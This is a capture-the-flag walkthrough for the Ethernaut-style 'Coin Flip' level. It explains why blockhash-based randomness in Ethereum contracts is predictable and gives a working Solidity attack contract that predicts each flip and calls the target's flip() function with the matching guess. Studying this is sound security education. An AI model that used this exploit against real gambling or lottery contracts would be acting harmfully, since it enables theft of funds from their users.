# Level 3 : Coin Flip

Here after reading the contract and the advice : “Beyond the console”, we understand that we have to write smart contract.

When beginning the easiest thing to do is go to [remix.ethereum.org](http://remix.ethereum.org/).

First create a new file with name “contract.sol” per example

Create contract, check it with the compiler on the left tab

Deploy it : you have several choice to deploy it. The more important is the environment : where will you deploy it ?

If you are using Metamask use this configuration : 

![Untitled](images/level_3.png)

And “voila” your smart contract is deployed on the network you are using.

Let’s get back to the challenge : 

First thing to know is that “**there is no true randomness on Ethereum Blockchain, only random generator considered good enough”** 

Developers currently create psuedo-randomness in Ethereum by hashing variables that are **unique**, or **difficult to tamper** with. Examples of such variables include `transaction timestamp`, `sender,address`, `block height`, etc.

Ethereum then offers two main cryptographic hashing functions, namely, SHA-3 and the newer KECCAK256, which hash the concatenation string of these input variables.

This generated hash is finally converted into a large integer, and then mod’ed by n. This is to get a discrete set of probability integers, inside the desired range of 0 to n. (here n =2 because of the two side of a coin)

**This method of deriving pseudo-randomness in smart contracts makes them vulnerable to attack. Adversaries who know the input,can thus guess the “random” outcome.**

This is the key to solving our `CoinFlip` level. Here, the input variables that determine the coin flip are publicly available to us.

1. Using Remix IDE create a malicious contract that mirrors CoinFlip.sol
2. Implement hackFlip() function that predicts the flip outcome. We know the blockhash and block.number so we are able to accurately predict the correct _guess.
3. Our function has to invoke the `originalContract.flip()` function with the correct `_guess`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Ilevel03.sol';

contract Hack {
    CoinFlip public originalContract = CoinFlip(0x85901236CC5247910ADa4445D6ECD32Ff13149f3); 
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hackFlip(bool _guess) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            originalContract.flip(_guess);
        } else {
            originalContract.flip(!_guess);
        }
    }
}
```

Remenber to create another file with CoinFlip contract copy/pasted

Then Using Remix IDE click 10 times on the hackFlip button

Check your result using `await contract.consecutivewins()` , inside the result array under `word` our wins are represented -> **0:10**

# **Key Security Takeaways**

- There’s no such thing as true randomness
- **Be careful when calculating “randomness” in your contract** (or even when inheriting from an existing random numbers library). In cases where you use randomness to determine contest winners, remember that **adversaries can easily guess the random outcome and hack your game!**